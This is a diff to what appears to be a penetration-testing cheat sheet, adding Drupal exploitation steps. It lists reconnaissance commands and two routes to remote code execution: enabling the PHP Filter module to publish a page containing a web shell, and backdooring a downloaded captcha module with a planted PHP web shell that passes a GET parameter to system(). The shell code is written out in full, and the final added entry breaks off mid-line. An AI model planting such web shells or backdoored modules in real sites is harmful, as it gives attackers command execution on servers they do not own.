@@ -1062,7 +1062,13 @@ $ curl -s <URL> | grep Drupal
 $ curl -s http://<domain name>/CHANGELOG.txt | grep -m2 ""
 $ droopescan scan drupal -u <URL>
 # Before version 8 - Enable PHP Filter Module -> Save -> Create a basic page with PHP web shell -> Text Format = PHP code
-# After version 8 -  wget https://ftp.drupal.org/files/projects/php-8.x-1.1.tar.gz -> Administration -> Reports -> Available updates -. Browse -> Install PHP Filter Module -> Save -> Create a basic page with PHP web shell -> Text Format = PHP code
+# After version 8 - $ wget https://ftp.drupal.org/files/projects/php-8.x-1.1.tar.gz -> Administration -> Reports -> Available updates -. Browse -> Install PHP Filter Module -> Save -> Create a basic page with PHP web shell -> Text Format = PHP code
+# Backdoored Module - $ wget --no-check-certificate  https://ftp.drupal.org/files/projects/captcha-8.x-1.2.tar.gz -> Create PHP web shell with contents:
+<?php
+system($_GET['fe8edbabc5c5c9b7b764504cd22b17af']);
+?>
+
+Create 
 ```
 
 - Jenkins
